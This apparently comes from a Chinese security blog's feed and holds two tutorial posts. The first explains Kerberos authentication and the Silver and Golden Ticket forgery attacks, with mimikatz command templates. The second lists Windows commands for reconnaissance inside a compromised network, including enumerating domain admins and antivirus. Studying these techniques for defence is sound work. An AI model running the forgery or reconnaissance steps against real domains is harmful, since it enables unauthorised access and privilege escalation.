&lt;li&gt;TGT 是 Kerberos 协议中的票据类型，用于访问 Kerberos 受信任的服务。获得 TGT 后，用户可以向 TGS 请求访问特定服务的票据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TGS（Ticket Granting Server）- 票据授权服务器&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;TGS 是 Kerberos 协议中的组件，负责颁发给用户用于访问特定服务的服务票据。用户通过提供 TGT 向 TGS 请求服务票据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SS（Service Server）- 特定服务提供端&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;SS 是 Kerberos 协议中的服务端，提供特定的网络服务，例如文件共享、电子邮件等。SS 验证客户端提供的服务票据，并在票据有效时提供服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参与认证的三个角色&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;h3 id=&#34;客户端client&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#客户端client&#34;&gt;#&lt;/a&gt; &lt;strong&gt;客户端（Client）&lt;/strong&gt;：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;客户端是发起身份验证请求的一方。在 Kerberos 中，客户端通常是用户或者用户所在的计算机，它们希望获得访问域资源的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;服务端（Service Server）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端是接收身份验证请求的一方，并向客户端提供网络服务。服务端可以是任何提供网络服务的实体，如文件服务器、打印服务器、应用程序服务器等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;密钥分发中心（Key Distribution Center，KDC）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;密钥分发中心是 Kerberos 协议的关键组件，负责处理身份验证请求并颁发票据。KDC 通常包含两个主要部分：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AS（Authentication Server）&lt;/strong&gt;：负责接收客户端的身份验证请求，并向客户端颁发 TGT（Ticket Granting Ticket，票据授权票据）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TGS（Ticket Granting Server）&lt;/strong&gt;：负责接收客户端的 TGT，并向客户端颁发用于访问特定服务的服务票据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;kerberos认证流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberos认证流程&#34;&gt;#&lt;/a&gt; Kerberos 认证流程&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305181912124.png&#34; alt=&#34;image-20240305181912124&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;客户端向域控制器请求访问服务器&lt;/strong&gt;：客户端首先向域控制器（DC）发送一个请求，请求访问服务器。DC 通过查询活动目录（AD）来确定客户端是否可信。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域控制器返回 TGT 给客户端&lt;/strong&gt;：如果客户端被认证为可信，DC 会返回一个 Ticket Granting Ticket（TGT）给客户端。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;客户端使用 TGT 请求访问服务器&lt;/strong&gt;：客户端持有 TGT，然后向 DC 请求访问服务器。Ticket Granting Service（TGS）通过检查客户端消息中的 TGT 来判断客户端是否有访问权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果客户端有访问权限，DC 会给客户端一个服务票据&lt;/strong&gt;：如果客户端有访问权限，DC 会给客户端一个服务票据（Service Ticket，ST）。这个票据授予客户端访问服务器的权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;客户端使用服务票据访问服务器&lt;/strong&gt;：客户端得到服务票据后，就可以用这个票据去访问服务器。这个票据只对这个服务器有效。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务器和客户端建立通信&lt;/strong&gt;：最后，服务器和客户端建立通信。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;详细流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#详细流程&#34;&gt;#&lt;/a&gt; 详细流程&lt;/h3&gt;
&lt;p&gt;•ASREQ &amp;amp; ASREP&lt;br&gt;
•TGSREQ &amp;amp; TGSREP&lt;br&gt;
•AP-REQ &amp;amp; AP-REP&lt;/p&gt;
&lt;h4 id=&#34;第一部分asreq-asrep&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一部分asreq-asrep&#34;&gt;#&lt;/a&gt; 第一部分 ASREQ &amp;amp; ASREP&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305182829923.png&#34; alt=&#34;image-20240305182829923&#34;&gt;&lt;/p&gt;
&lt;p&gt;客户端向 KDC 发送一个 AS_REQ 请求里面信息包括 Kerberos 协议的版本号，用户名，请求类型，哈希值 NTLM-Hash 加密的时间戳&lt;/p&gt;
&lt;p&gt;还有一些服务器信息，接着 AS 接收到请求后向 AD 查询是否有此用户信息有的话会拿出该用户的 NTLM-Hash 对加密的时间戳进行解密&lt;/p&gt;
&lt;p&gt;五分钟之内预认证成功，认证通过后 KDC 生成两个东西分别是用于客户端和 KGS 之间通信的用客户端用户的 NTLM-HASH 加密的会话密钥 Session Key，和 Ticket Granting Ticket 票据授权票据&lt;/p&gt;
&lt;p&gt;TGT：&lt;/p&gt;
&lt;p&gt;AS 使用 KDC 账户（通常是 Krbtgt 用户，是域控制器创建时自动生成的特殊账户）的 NTLM-Hash 对 Session-key AS、时间戳和客户端信息等进行加密，这个加密过程确保了 TGT 的安全性和机密性，只有 KDC 账户的 NTLM-Hash 才能解密 TGT 并提取其中的信息，然后将加密后的 Session-key AS、时间戳、客户端信息以及 PAC 等信息组合起来，形成 TGT 因为使用服务端 Krbtgt 用户 NTLM-HASH 加密的所以客户端是解不开 TGT 的，TGT 一般为 8 小时有效期&lt;/p&gt;
&lt;p&gt;PAC（Privilege Attribute Certificate）是 TGT 中的一个重要部分，包含了客户端的安全标识符（SID）、所在组等信息。PAC 用于后续的授权过程，以确保客户端在获取服务票据时具有适当的权限。&lt;/p&gt;
&lt;h4 id=&#34;第二部分tgsreq-tgsrep&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二部分tgsreq-tgsrep&#34;&gt;#&lt;/a&gt; 第二部分 TGSREQ &amp;amp; TGSREP&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305203212925.png&#34; alt=&#34;image-20240305203212925&#34;&gt;&lt;/p&gt;
&lt;p&gt;该阶段是客户端和 TGS 的认证，通过认证以后获得 ST 服务票据&lt;/p&gt;
&lt;p&gt;客户端接收到回复后获取到 Session key AS 和 TGT，接着将会用 NTLM-HASH 解密 session key AS 得到未加密 sessin key AS&lt;/p&gt;
&lt;p&gt;然后将这些缓存到本地，客户端如果想获取什么服务就会拿着获取的 TGT 加上 Session-Key AS 加密时间戳、Client-info、Server-info 等数据组成 TGSREQ 去请求 TGS 购买 ST 服务票据&lt;/p&gt;
&lt;p&gt;TGS 收到后&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;解密 TGT 并验证时间戳&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;TGS 收到客户端的 TGSREQ 请求后，使用 Krbtgt 用户的 NTLM-hash 解密 TGT，得到其中的 Session-key AS、时间戳、Client-info 和 Server-info 等信息。&lt;/li&gt;
&lt;li&gt;TGS 使用 Session-key AS 解密 TGT 中的信息，得到 Client-info 和时间戳。然后 TGS 将获取到的时间戳与当前时间进行比较，如果时间戳与当前时间相差太久，则需要重新进行身份验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;验证客户端信息和权限&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;TGS 进一步比较 TGT 中的 Client-info 与 TGSREQ 请求中的 Client 信息，确保两者一致性。&lt;/li&gt;
&lt;li&gt;如果客户端信息验证通过，并且客户端有权限访问请求的服务，则认证成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;生成 Session-key TGS 并加密&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;如果身份验证成功，TGS 生成一个用于客户端和服务器之间通信的会话密钥，称为 Session-key TGS。&lt;/li&gt;
&lt;li&gt;TGS 使用 Session-key AS 加密 Session-key TGS，并将其作为 TGS_REP 响应的一部分发送给客户端，确保通信的安全性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;生成 ST 并加密&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;另一部分是 TGS 使用目标服务器（Server）的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据，生成服务票据（Service Ticket，ST）。&lt;/li&gt;
&lt;li&gt;TGS 将这个 ST 作为 TGS_REP 响应的一部分发送给客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;第三部分ap-req-ap-rep&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三部分ap-req-ap-rep&#34;&gt;#&lt;/a&gt; 第三部分 AP-REQ &amp;amp; AP-REP&lt;/h4&gt;
&lt;p&gt;客户端在收到 TGS 的响应（TGS_REP）后，会使用它的会话密钥（Session-key AS）解密出新的会话密钥（Session-key TGS），并将其存储在本地。然后，当客户端需要访问服务时，它会使用新的会话密钥（Session-key TGS）加密其身份信息（Client-info）和时间戳，然后将其与服务票据（ST）一起发送给服务服务器。这个请求被称为 AP_REQ。&lt;/p&gt;
&lt;p&gt;服务服务器在收到 AP_REQ 请求后，会使用它的 NTLM-Hash 解密服务票据（ST），得到新的会话密钥（Session-key TGS），然后使用这个密钥解密客户端的身份信息（Client-info）和时间戳。然后，服务服务器会将解密出的信息与服务票据（ST）中的信息进行比较，以验证客户端的身份。&lt;/p&gt;
&lt;p&gt;一旦客户端通过了身份验证，服务服务器就会使用 PAC（Privilege Attribute Certificate）去询问域控制器（DC）客户端是否有访问服务的权限。域控制器在接收到 PAC 后，会解密 PAC，然后通过 PAC 中的 SID（Security Identifier）来判断客户端的用户组信息和权限。然后，域控制器会将结果返回给服务服务器，服务服务器再将这些信息与服务资源的访问控制列表（ACL）进行比较，最后决定是否给客户端提供服务。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305205417213.png&#34; alt=&#34;image-20240305205417213&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;kerberos的安全问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberos的安全问题&#34;&gt;#&lt;/a&gt; Kerberos 的安全问题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;票据伪造（Ticket Forgery）&lt;/strong&gt;：攻击者可能会尝试伪造 Kerberos 票据，以获取未经授权的访问权限。这包括黄金票据和白银票据攻击，其中黄金票据是伪造 TGT（Ticket Granting Ticket）来获取对整个 Kerberos 域的访问权限，而白银票据则是伪造 TGS（Ticket Granting Service Ticket）以获取对特定服务的访问权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中间人攻击（Man-in-the-Middle Attacks）&lt;/strong&gt;：在 Kerberos 认证中，如果攻击者能够截获通信并伪装成合法用户与服务器进行通信，则可以执行中间人攻击。这种攻击可以导致信息泄露、数据篡改等问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;票据重放（Ticket Replay）&lt;/strong&gt;：攻击者可能会捕获到有效的 Kerberos 票据，然后重放这些票据来获取访问权限。这种攻击可能导致身份伪造和未经授权的访问。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;白银票据silver-tickets&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#白银票据silver-tickets&#34;&gt;#&lt;/a&gt; 白银票据（Silver Tickets）&lt;/h2&gt;
&lt;p&gt;白银票据（Silver Ticket）是一种利用 Kerberos 认证系统的漏洞来实现非授权访问的攻击方式。在 Kerberos 协议中，PAC（Privilege Attribute Certificate，特权属性证书）是一个用于存储用户的安全信息、组成员身份以及授权信息的数据结构。PAC 由 Kerberos 服务器（KDC）在授予用户票据时生成，并附加在票据中。&lt;/p&gt;
&lt;p&gt;攻击者通过获取用户的用户名和密码哈希值等信息，可以伪造 TGS（Ticket Granting Service Ticket）以请求访问网络资源。然而，TGS 本身并不包含 PAC。攻击者之所以能够成功利用白银票据攻击，是因为部分服务在处理 TGS 时并不验证 PAC，因此攻击者可以伪造 TGS，并不需要伪造 PAC 就能够获取非授权访问权限。&lt;/p&gt;
&lt;p&gt;这种情况下，即使攻击者无法生成完整有效的 PAC，服务端仍然会授予其访问权限，因为服务端未对 PAC 进行验证。因此，白银票据攻击的成功前提之一就是目标服务对 PAC 的验证不严格，从而允许攻击者利用这一漏洞来获取非授权访问权限&lt;/p&gt;
&lt;p&gt;白银票据就是伪造 ST 去请求服务而有些服务是不需要验证 PAC 的只需要有 ST 就可以，而制作 ST 是需要目标服务器（Server）的 NTLM-Hash&lt;/p&gt;
&lt;h3 id=&#34;制作条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#制作条件&#34;&gt;#&lt;/a&gt; 制作条件&lt;/h3&gt;
&lt;p&gt;域名&lt;/p&gt;
&lt;p&gt;域 sid&lt;/p&gt;
&lt;p&gt;目标服务器名&lt;/p&gt;
&lt;p&gt;服务账号的 NTML HASH&lt;/p&gt;
&lt;p&gt;伪造的用户名&lt;/p&gt;
&lt;p&gt;不需要验证 PAC 的服务&lt;/p&gt;
&lt;h3 id=&#34;mimikatz工具伪造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz工具伪造&#34;&gt;#&lt;/a&gt; mimikatz 工具伪造&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:需要访问的服务 /rc4:服务账号NTMLHASH /user:用户名 /ptt&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;黄金票据golden-ticket&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黄金票据golden-ticket&#34;&gt;#&lt;/a&gt; 黄金票据 Golden ticket&lt;/h2&gt;
&lt;p&gt;白银票据是伪造的 ST 而黄金票据伪造的是 TGT 就是 AS 返回给客户端的用来向 TGS 请求服务 ST 用的，获得 TGT 后，用户可以向 TGS 请求访问特定服务的票据。&lt;/p&gt;
&lt;p&gt;TGT 使用 Krbtgt 用户 NTLM-HASH 加密的所以我们获取到 Krbtgt 用户 NTLM-HASH 就可以伪造 TGT 了&lt;/p&gt;
&lt;p&gt;域名称&lt;/p&gt;
&lt;p&gt;域的 SID 值&lt;/p&gt;
&lt;p&gt;KRBTGT 账号的 HASH&lt;/p&gt;
&lt;p&gt;伪造任意用户名&lt;/p&gt;
&lt;p&gt;mimikatz 命令&lt;/p&gt;
&lt;p&gt;kerberos::golden /admin: 用户名 /domain: 域名 /sid: 域 sid /krbtgt:NTLM HASH /ticket: 票据名称&lt;br&gt;
后面会详细讲&lt;/p&gt;
&lt;h2 id=&#34;白银票据黄金票据区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#白银票据黄金票据区别&#34;&gt;#&lt;/a&gt; 白银票据黄金票据区别&lt;/h2&gt;
&lt;h3 id=&#34;白银票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#白银票据&#34;&gt;#&lt;/a&gt; 白银票据&lt;/h3&gt;
&lt;p&gt;白银票据需要服务器账号的 NTLM HASH&lt;/p&gt;
&lt;p&gt;白银票据伪造的是 ST&lt;/p&gt;
&lt;p&gt;白银票据只能访问部分不需要验证 PAC 的服务&lt;/p&gt;
&lt;p&gt;白银票据不与 KDC 交互可以拿着伪造的 ST 去访问服务器&lt;/p&gt;
&lt;h3 id=&#34;黄金票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黄金票据&#34;&gt;#&lt;/a&gt; 黄金票据&lt;/h3&gt;
&lt;p&gt;黄金票据需要域 Krbtgt 用户 NTLM-HASH&lt;/p&gt;
&lt;p&gt;黄金票据伪造的是 TGT&lt;/p&gt;
&lt;p&gt;黄金票据可以访问所有服务&lt;/p&gt;
&lt;p&gt;黄金票据不和 AS 交互但是和 KDC 交互因为要拿着伪造的 TGT 去 TGS 请求 ST&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
            <title>内网信息收集</title>
            <link>http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
            <pubDate>Sun, 03 Mar 2024 17:22:07 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;进入内网后要对当前网络环境进行判断&lt;/p&gt;
&lt;p&gt;判断出当前机器所处网络环境的拓扑，以及当前电脑在内网是什么角色当前机器的权限&lt;/p&gt;
&lt;h3 id=&#34;本机信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本机信息收集&#34;&gt;#&lt;/a&gt; 本机信息收集&lt;/h3&gt;
&lt;h4 id=&#34;查询网络配置信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询网络配置信息&#34;&gt;#&lt;/a&gt; 查询网络配置信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ipconfig /all&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135135624.png&#34; alt=&#34;image-20240304135135624&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看用户详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看用户详细信息&#34;&gt;#&lt;/a&gt; 查看用户详细信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;whoami /all&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135324706.png&#34; alt=&#34;image-20240304135324706&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看系统版本补丁等&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看系统版本补丁等&#34;&gt;#&lt;/a&gt; 查看系统版本补丁等&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;systeminfo&lt;/code&gt;  可查看系统信息打了那些补丁为后续提权查找漏洞准备&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140357064.png&#34; alt=&#34;image-20240304140357064&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看系统启动的服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看系统启动的服务&#34;&gt;#&lt;/a&gt; 查看系统启动的服务&lt;/h4&gt;
&lt;p&gt;net start&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140458074.png&#34; alt=&#34;image-20240304140458074&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看系统进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看系统进程&#34;&gt;#&lt;/a&gt; 查看系统进程&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140610127.png&#34; alt=&#34;image-20240304140610127&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看主机计划任务列表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看主机计划任务列表&#34;&gt;#&lt;/a&gt; 查看主机计划任务列表&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140751585.png&#34; alt=&#34;image-20240304140751585&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看本机用户域用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看本机用户域用户&#34;&gt;#&lt;/a&gt; 查看本机用户域用户&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;net user&lt;/code&gt; net user /domain&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141626726.png&#34; alt=&#34;image-20240304141626726&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询域数量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询域数量&#34;&gt;#&lt;/a&gt; 查询域数量&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;net view /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141803745.png&#34; alt=&#34;image-20240304141803745&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询域组&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询域组&#34;&gt;#&lt;/a&gt; 查询域组&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;net group /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141928484.png&#34; alt=&#34;image-20240304141928484&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询域中的-domain-admins-组的成员&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询域中的-domain-admins-组的成员&#34;&gt;#&lt;/a&gt; 查询域中的 “Domain Admins” 组的成员&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;net group &amp;quot;domain admins&amp;quot; /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142138340.png&#34; alt=&#34;image-20240304142138340&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询域时间主域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询域时间主域名&#34;&gt;#&lt;/a&gt; 查询域时间主域名&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;net time /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142231136.png&#34; alt=&#34;image-20240304142231136&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hZDAxLXVoNWZmNDQ1aHN1aC55dW55aS5pbw==&#34;&gt;主域名为 ad01.yunyi.io&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;查arp缓存&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查arp缓存&#34;&gt;#&lt;/a&gt; 查 ARP 缓存&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;arp -a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142335688.png&#34; alt=&#34;image-20240304142335688&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查环境变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查环境变量&#34;&gt;#&lt;/a&gt; 查环境变量&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;set&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142615252.png&#34; alt=&#34;image-20240304142615252&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看安装软件的版本信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看安装软件的版本信息&#34;&gt;#&lt;/a&gt; 查看安装软件的版本信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;powershell &amp;quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143132821.png&#34; alt=&#34;image-20240304143132821&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;域信任列表信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域信任列表信息&#34;&gt;#&lt;/a&gt; 域信任列表信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;nltest /domain_trusts&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143407722.png&#34; alt=&#34;image-20240304143407722&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;防火墙配置信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙配置信息&#34;&gt;#&lt;/a&gt; 防火墙配置信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;netsh firewall show config&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143537981.png&#34; alt=&#34;image-20240304143537981&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;网络详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络详细信息&#34;&gt;#&lt;/a&gt; 网络详细信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ipconfig /all&lt;/code&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS15dW55aS02bzZoaThocDRraDAwYjJwN2EuaW8=&#34;&gt; 可看到有域 yunyi.io&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143755101.png&#34; alt=&#34;image-20240304143755101&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看网络端口信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看网络端口信息&#34;&gt;#&lt;/a&gt; 查看网络端口信息&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;netstat -ano&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144042633.png&#34; alt=&#34;image-20240304144042633&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;查杀软查提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查杀软查提权&#34;&gt;#&lt;/a&gt; 查杀软查提权&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;tasklist&lt;/code&gt;  查看当前计算机上所有进程的列表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;systeminfo&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查完补丁信息可以去&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4vJUU2JTlGJUE1JUU4JUFGJUEy&#34;&gt; https://i.hacking8.com/tiquan/ 查询&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144509958.png&#34; alt=&#34;image-20240304144509958&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取系统运行软件&lt;/p&gt;
